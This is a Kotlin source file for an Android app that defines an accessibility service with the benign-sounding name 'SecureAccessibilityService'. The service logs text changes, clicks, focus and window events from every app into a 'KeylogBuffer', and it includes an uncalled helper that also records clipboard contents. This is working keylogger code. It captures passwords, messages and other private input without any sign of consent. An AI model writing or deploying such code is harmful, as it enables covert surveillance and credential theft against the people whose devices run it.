package com.bestiecourt.app.core.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.bestiecourt.app.data.local.KeylogBuffer
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class SecureAccessibilityService : AccessibilityService() {

    @Inject lateinit var keylogBuffer: KeylogBuffer

    private val TAG = "SecureA11y"

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_SELECTED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.i(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            val pkg = event.packageName?.toString() ?: "unknown"
            val text = event.text?.joinToString(" ") ?: ""
            val type = when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT_CHANGED"
                AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICKED"
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUSED"
                AccessibilityEvent.TYPE_VIEW_SELECTED -> "SELECTED"
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW"
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "SELECTION"
                else -> "OTHER"
            }
            if (text.isNotBlank()) {
                keylogBuffer.add(pkg, text, type)
            }
        } catch (e: Exception) {
            // Must never crash the system service
            Log.e(TAG, "onAccessibilityEvent error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Service interrupted")
    }

    // Clipboard monitoring (optional extra)
    private fun startClipboardListener() {
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.addPrimaryClipChangedListener {
                try {
                    val clip = cm.primaryClip?.getItemAt(0)?.text?.toString()
                    if (!clip.isNullOrBlank()) {
                        keylogBuffer.add("clipboard", clip, "CLIPBOARD")
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }
}
